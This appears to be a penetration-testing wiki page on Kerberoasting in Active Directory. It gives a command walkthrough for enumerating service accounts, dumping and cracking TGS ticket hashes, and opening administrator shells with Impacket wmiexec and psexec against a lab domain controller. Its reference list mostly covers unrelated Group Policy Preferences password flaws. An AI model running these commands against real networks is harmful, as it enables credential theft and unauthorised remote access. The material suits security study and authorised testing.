# Kerberoasting

## Attack Description

Kerberoasting involves extracting a hash of the encrypted material from a Kerberos "Ticket Granting Service" ticket reply (TGS\_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS\_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.

![Kerberos Authentication process](../../.gitbook/assets/kerberos\_auth3.JPG)

Managed service accounts mitigate this risk, due to the complexity of their passwords, but they are not in active use in many environments. It is worth noting that shutting down the server hosting the service doesn’t mitigate this issue, as the attack doesn’t involve communication with the target service. It is therefore important to regularly audit the purpose and privilege of all enabled accounts. Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance.&#x20;

## Attack Requirements

In order to complete this attack, we need to do the following, and so any tool that can assist with providing the following functionality can be used:

* Identify SPN accounts associated with a service instance
* Dump and crack the hash or hashes
* Connect to the target using the obtained creds

## Attack Tools

The list of tools below contains some of the tools that can be used for this attack. Note that some of the listed tools do the same thing, and so it's down to user preference as to which tools are used. Tools:

GetUserSPNs.py (Impacket) --> will try to find and fetch Service Principal Names that are associated with normal user accounts, and dump the associated TGS hash. Output is compatible with JtR and HashCat

ldapsearch --> Can be used to identify accounts that are configured with SPNs.

hashcat --> Crack the extracted hash.

john --> Crack the extracted hash.

wmiexec.py (Impacket) --> A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.

psexec.py (Impacket) --> PSEXEC like functionality example using RemComSvc.&#x20;

## Attack Example

### Discovery

Find the Service Principle Names using ldapsearch:

```
ldapsearch -x -h 10.99.99.101 -p 389 -D 'srvcaccount' -w 'P@ssw0rd1' -b "dc=testdomain,dc=local" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname
```

Find the Service Principle Names and dump the hashes (requires a valid account on the domain) using GetUserSPNs:

```
GetUserSPNs.py -target-domain testdomain.local -usersfile users.txt -outputfile hashes2.txt -dc-ip 10.99.99.101 testdomain.local/srvcaccount:P@ssw0rd1
```

### Exploit

Crack the extracted hashes with john:

```
john --format:krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Crack the extracted hashes with hashcat:

```
hashcat -m 13100 --force hashes.txt /usr/share/wordlists/rockyou.txt
```

Use the cracked hash and the corresponding username to connect to the target system using wmiexec.py:

```
wmiexec.py testdomain.local/administrator:Password1@dc1.testdomain.local
```

Use the cracked hash and the corresponding username to connect to the target system using psexec.py:

```
psexec.py testdomain.local/administrator:Password1@dc1.testdomain.local cmd.exe
```



## References

{% embed url="https://adsecurity.org/?p=2293" %}

{% embed url="https://www.kali.org/tools/gpp-decrypt" %}

{% embed url="https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder" %}

[https://bitbucket.org/grimhacker/gpppfinder/src/master/](https://bitbucket.org/grimhacker/gpppfinder/src/master/)

[https://bitbucket.org/grimhacker/gpppfinder/downloads/](https://bitbucket.org/grimhacker/gpppfinder/downloads/)

{% embed url="https://msrc-blog.microsoft.com/2014/05/13/ms14-025-an-update-for-group-policy-preferences" %}

{% embed url="https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30" %}

